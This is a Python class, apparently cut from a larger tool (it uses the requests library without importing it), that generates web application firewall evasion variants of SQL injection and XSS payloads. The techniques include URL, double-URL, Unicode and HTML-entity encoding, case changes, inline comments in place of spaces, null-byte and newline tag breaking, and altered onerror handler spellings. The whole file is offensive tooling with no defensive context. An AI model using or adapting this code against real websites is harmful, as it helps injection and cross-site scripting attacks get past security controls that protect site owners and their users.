class WAFBypasser:
    def __init__(self):
        self.bypass_techniques = []
    
    def generate_sqli_bypasses(self, original_payload):
        """Generate WAF bypass payloads for SQL injection"""
        bypass_payloads = []
        
        # Case variation
        bypass_payloads.append(original_payload.upper())
        bypass_payloads.append(original_payload.lower())
        
        # URL encoding
        bypass_payloads.append(requests.utils.quote(original_payload))
        
        # Double URL encoding
        bypass_payloads.append(requests.utils.quote(requests.utils.quote(original_payload)))
        
        # Unicode encoding
        unicode_payload = ''.join([f'%u{ord(c):04x}' for c in original_payload])
        bypass_payloads.append(unicode_payload)
        
        # HTML encoding
        html_payload = ''.join([f'&#{ord(c)};' for c in original_payload])
        bypass_payloads.append(html_payload)
        
        # Whitespace bypass
        whitespace_bypass = original_payload.replace(' ', '/**/')
        bypass_payloads.append(whitespace_bypass)
        
        # Comment bypass
        comment_bypass = original_payload.replace(' ', '/*!*/')
        bypass_payloads.append(comment_bypass)
        
        return bypass_payloads
    
    def generate_xss_bypasses(self, original_payload):
        """Generate WAF bypass payloads for XSS"""
        bypass_payloads = []
        
        # Case variation
        bypass_payloads.append(original_payload.upper())
        bypass_payloads.append(original_payload.lower())
        
        # Tag breaking
        tag_breaks = [
            original_payload.replace('<', '<%00'),
            original_payload.replace('<', '<<'),
            original_payload.replace('<', '<%0a'),
        ]
        bypass_payloads.extend(tag_breaks)
        
        # Event handler variations
        event_handlers = [
            original_payload.replace('onerror', 'OnError'),
            original_payload.replace('onerror', 'onError'),
            original_payload.replace('onerror', 'onerror '),  # trailing space
        ]
        bypass_payloads.extend(event_handlers)
        
        return bypass_payloads